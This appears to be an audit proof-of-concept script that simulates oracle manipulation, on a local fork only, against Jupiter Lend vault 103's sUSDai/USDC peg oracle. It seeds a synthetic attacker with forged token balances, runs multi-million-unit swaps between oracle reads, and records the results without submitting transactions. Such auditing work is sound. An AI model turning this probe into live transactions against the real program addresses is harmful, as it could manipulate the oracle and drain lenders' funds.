#!/usr/bin/env node
// Local-fork-only, freshly signed v1 probes for Jupiter Lend vault 103's
// sUSDai/USDC DEX peg oracle. This file never calls sendTransaction.
const fs = require('fs');
const crypto = require('crypto');
const modules = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram} =
  require(modules + '@solana/web3.js');
const {TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, getAssociatedTokenAddressSync} =
  require(modules + '@solana/spl-token');
const {encodeV1} = require('../klend-v1-composition.js');

const fork = process.env.V103_FORK || 'http://127.0.0.1:9137';
const outPath = __dirname + '/signed-swap-oracle.json';
const P = x => new PublicKey(x);
const PROGRAM = {
  dex: P('jupZ4m2GqUCJ5iueMfzQf8khFfH31d4XAQt3RzCT9Vd'),
  oracle: P('jupnw4B6Eqs7ft6rxpzYLJZYSnrpRgPcr589n5Kv4oc'),
  liquidity: P('jupeiUmn818Jg1ekPURTpr4mFo29p46vygyykFJ3wZC'),
};
const A = {
  oracle: P('Hf9Yw2a1EA9aTUbHS8N7AoyqXvWrRvsZqGJuC4YVeaXN'),
  oracleSource: P('H8i4Bz4inXLyWQFgGjXc8sYNCvQgAaAAS45ZZ4UqCCcV'),
  conversionSource: P('DXSLbLNfjYrjp4KKoDnLXT5j5Wdcr9hZCGCwpeeyDxZV'),
  externalCenterPrice: P('2gFY1YckrZtmK6LiTzTSdq5JbU3SdfZaHzLQoseD1xHu'),
  dex: P('G41Dqz9A1v39TT2MryR5BkZU2a7UzfUkiRHyJGuRfeyF'),
  mint0: P('sUSDai6Y3GxysDEtA9BVcEFTaog6UZpYUVxJiMhAKYE'),
  mint1: P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
  supply0: P('EdRupWtgK6FRjTHCo2TgbjDUGe91oNQno1tG6Vj35fvW'),
  supply1: P('8qXBLcG7hm1NKeAxGbX7kxEy9HhevX4SN6yAmDduQNYk'),
  reserve0: P('2zhomdC3giLb5vf91fCZiKWiFXAD9NwMcV8EQo8NmA3i'),
  reserve1: P('94vK29npVbyRHXH63rRcTiSr26SFhrQTzbpNJuhQEDu'),
  rate0: P('5BxfXqPPbGwnhSp1wHsTwwqEXVeoKebHMZvyZcxh7U9P'),
  rate1: P('5pjzT5dFTsXcwixoab1QDLvZQvpYJxJeBphkyfHGn688'),
  vault0: P('GzjLtjeaaFBerWrpJx8VXwpXcdzkUFm9zsXgaedsbXsW'),
  vault1: P('BmkUoKMFYBxNSzWXyUjyMJjMAaVz4d8ZnxwwmhDCUXFB'),
  liquidity: P('7s1da8DduuBFqGra5bJBjpnvL5E9mGzCuMk1Qkh4or2Z'),
};
const DISC = {
  swapIn: Buffer.from([141, 172, 10, 208, 69, 9, 56, 154]),
  oracle: Buffer.from([92, 88, 161, 46, 230, 193, 46, 237]),
};
const seed = crypto.createHash('sha256').update('jupiter-v103-outsider-2026-10-15').digest();
const attacker = Keypair.fromSeed(seed);
const ata0 = getAssociatedTokenAddressSync(A.mint0, attacker.publicKey, false, TOKEN_2022_PROGRAM_ID);
const ata1 = getAssociatedTokenAddressSync(A.mint1, attacker.publicKey, false, TOKEN_PROGRAM_ID);
let rpcId = 0;
async function rpc(method, params) {
  const res = await fetch(fork, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
  const json = await res.json();
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`);
  return json.result;
}
const u64 = n => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b; };
const readU128 = (b, o) => { let n = 0n; for (let i = 15; i >= 0; --i) n = (n << 8n) + BigInt(b[o+i]); return n; };

async function cloneAttackerToken(source, target, mint, amount, tokenProgram) {
  const original = (await rpc('getAccountInfo', [source.toBase58(),
    {encoding: 'base64', commitment: 'processed'}])).value;
  if (!original) throw new Error(`missing token source ${source}`);
  if (original.owner !== tokenProgram.toBase58())
    throw new Error(`unexpected source program ${source}: ${original.owner}`);
  const data = Buffer.from(original.data[0], 'base64');
  if (!data.subarray(0, 32).equals(mint.toBuffer())) throw new Error(`mint mismatch ${source}`);
  attacker.publicKey.toBuffer().copy(data, 32);
  data.writeBigUInt64LE(BigInt(amount), 64);
  await rpc('surfnet_setAccount', [target.toBase58(), {data: data.toString('hex'),
    executable: false, lamports: original.lamports, owner: tokenProgram.toBase58(), rentEpoch: 0}]);
}

function oracleRead() {
  return new TransactionInstruction({programId: PROGRAM.oracle, keys: [
    A.oracle, A.oracleSource, A.dex, A.supply0, A.supply1, A.reserve0, A.reserve1,
    A.conversionSource,
  ].map(pubkey => ({pubkey, isSigner: false, isWritable: false})),
  data: Buffer.concat([DISC.oracle, Buffer.from([100, 0])])});
}

function swapIn(swap0to1, amount) {
  const p = (pubkey, isWritable = false, isSigner = false) => ({pubkey, isWritable, isSigner});
  return new TransactionInstruction({programId: PROGRAM.dex, keys: [
    p(attacker.publicKey, false, true), p(A.dex, true), p(ata0, true), p(ata1, true),
    p(attacker.publicKey), p(ata0, true), p(ata1, true), p(A.mint0), p(A.mint1),
    p(A.reserve0, true), p(A.reserve1, true), p(A.rate0), p(A.rate1),
    p(A.vault0, true), p(A.vault1, true), p(A.supply0, true), p(A.supply1, true),
    p(P('2hAjymMb6MPSoJ6jm9MZotJuPsFSCYa3eQ3qMysAFZLw'), true),
    p(P('3RUCn7NZ5Cfh5AeVmGhsk9CL9JxNrymw1EGSkhMJmSJR'), true),
    p(A.liquidity), p(PROGRAM.liquidity),
    p(TOKEN_2022_PROGRAM_ID), p(TOKEN_PROGRAM_ID), p(PROGRAM.oracle),
    p(A.externalCenterPrice), p(A.conversionSource),
  ], data: Buffer.concat([DISC.swapIn, Buffer.from([swap0to1 ? 1 : 0]), u64(amount), u64(0n)])});
}

function signV1(instructions, blockhash) {
  const encoded = encodeV1(instructions, attacker.publicKey, blockhash);
  const compiled = new TransactionMessage({payerKey: attacker.publicKey, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  if (encoded.requiredSignatures !== 1 || !compiled.staticAccountKeys[0].equals(attacker.publicKey))
    throw new Error('unexpected signer set');
  const wire = Buffer.from(encoded.wire);
  const msg = wire.subarray(0, wire.length - 64);
  const priv = crypto.createPrivateKey({key: Buffer.concat([
    Buffer.from('302e020100300506032b657004220420', 'hex'), Buffer.from(seed),
  ]), format: 'der', type: 'pkcs8'});
  crypto.sign(null, msg, priv).copy(wire, wire.length - 64);
  return {encoded, wire};
}

function decodeReturns(logs) {
  const prefix = `Program return: ${PROGRAM.oracle.toBase58()} `;
  return (logs || []).filter(x => x.startsWith(prefix)).map(x => {
    const b = Buffer.from(x.slice(prefix.length), 'base64');
    if (b.length < 32) return null;
    return {supplyRateX15: readU128(b, 0).toString(), borrowRateX15: readU128(b, 16).toString()};
  }).filter(Boolean);
}
function tokenImage(row) {
  if (!row?.data) return null;
  const data = Buffer.from(row.data[0], 'base64');
  return {program: row.owner, mint: P(data.subarray(0, 32)).toBase58(),
    authority: P(data.subarray(32, 64)).toBase58(), amountRaw: data.readBigUInt64LE(64).toString()};
}
async function simulate(label, instructions) {
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const {encoded, wire} = signV1(instructions, blockhash);
  const watched = [ata0, ata1, A.supply0, A.supply1, A.reserve0, A.reserve1, A.vault0, A.vault1];
  const result = await rpc('simulateTransaction', [wire.toString('base64'), {encoding: 'base64',
    sigVerify: true, replaceRecentBlockhash: false, commitment: 'processed', innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watched.map(String)}}]);
  return {label, err: result.value.err, unitsConsumed: result.value.unitsConsumed,
    wire: {version: 1, bytes: encoded.sizeBytes, accounts: encoded.addressCount,
      instructions: encoded.instructionCount, requiredSignatures: encoded.requiredSignatures,
      sha256: crypto.createHash('sha256').update(wire).digest('hex')},
    oracleReturns: decodeReturns(result.value.logs),
    attackerPost: {sUSDai: tokenImage(result.value.accounts?.[0]), usdc: tokenImage(result.value.accounts?.[1])},
    logs: result.value.logs};
}

async function main() {
  await rpc('surfnet_setAccount', [attacker.publicKey.toBase58(), {data: '', executable: false,
    lamports: 10_000_000_000, owner: SystemProgram.programId.toBase58(), rentEpoch: 0}]);
  await cloneAttackerToken(A.vault0, ata0, A.mint0, 15_000_000_000_000n, TOKEN_2022_PROGRAM_ID);
  await cloneAttackerToken(A.vault1, ata1, A.mint1, 15_000_000_000_000n, TOKEN_PROGRAM_ID);
  // Explicitly load all public accounts before measuring the local fork baseline.
  for (const address of Object.values(A)) await rpc('getAccountInfo', [address.toBase58(),
    {encoding: 'base64', commitment: 'processed'}]);
  const cases = [
    ['oracle_control', [oracleRead()]],
    ['susdai_to_usdc_1m', [oracleRead(), swapIn(true, 1_000_000_000_000n), oracleRead()]],
    ['susdai_to_usdc_5m', [oracleRead(), swapIn(true, 5_000_000_000_000n), oracleRead()]],
    ['susdai_to_usdc_8m', [oracleRead(), swapIn(true, 8_000_000_000_000n), oracleRead()]],
    ['usdc_to_susdai_1m', [oracleRead(), swapIn(false, 1_000_000_000_000n), oracleRead()]],
    ['usdc_to_susdai_5m', [oracleRead(), swapIn(false, 5_000_000_000_000n), oracleRead()]],
  ];
  const results = [];
  for (const [label, instructions] of cases) {
    const r = await simulate(label, instructions);
    results.push(r);
    console.log(JSON.stringify({label, err: r.err, wire: r.wire, oracle: r.oracleReturns,
      attackerPost: r.attackerPost, lastLogs: r.logs?.slice(-8)}));
  }
  const output = {generatedAt: new Date().toISOString(), scope: 'local mainnet fork simulation only',
    mainnetSubmission: false, sigVerify: true, replaceRecentBlockhash: false,
    attacker: attacker.publicKey.toBase58(), attackerTokenAccounts: {sUSDai: String(ata0), usdc: String(ata1)},
    diagnosticSeededBalancesRaw: {sUSDai: '15000000000000', usdc: '15000000000000'}, results};
  fs.writeFileSync(outPath, JSON.stringify(output, null, 2));
}
main().catch(e => { console.error(e.stack); process.exitCode = 1; });
